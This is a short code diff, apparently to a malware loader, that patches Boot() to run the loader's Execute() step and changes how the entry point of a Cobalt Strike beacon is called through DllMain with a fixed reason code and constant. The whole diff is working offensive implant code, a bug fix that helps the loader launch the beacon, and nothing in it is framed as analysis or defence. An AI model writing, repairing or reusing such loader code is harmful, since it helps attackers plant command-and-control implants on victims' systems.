@@ -81,6 +81,8 @@ errno Boot()
         }
         runtime->Memory.Free(image);
         runtime->Argument.EraseAll();
+        // initialize dll before start beacon
+        err = loader->Execute();
         break;
     }
     if (err != NO_ERROR || loader == NULL)
@@ -92,10 +94,8 @@ errno Boot()
     // call cs beacon entry point
     DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
     HMODULE   hModule = (HMODULE)(loader->ImageBase);
-    if (dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
+    if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
     {
-        return NO_ERROR;
-    } else {
         err = ERR_CALL_BEACON_ENTRY_POINT;
     }
 
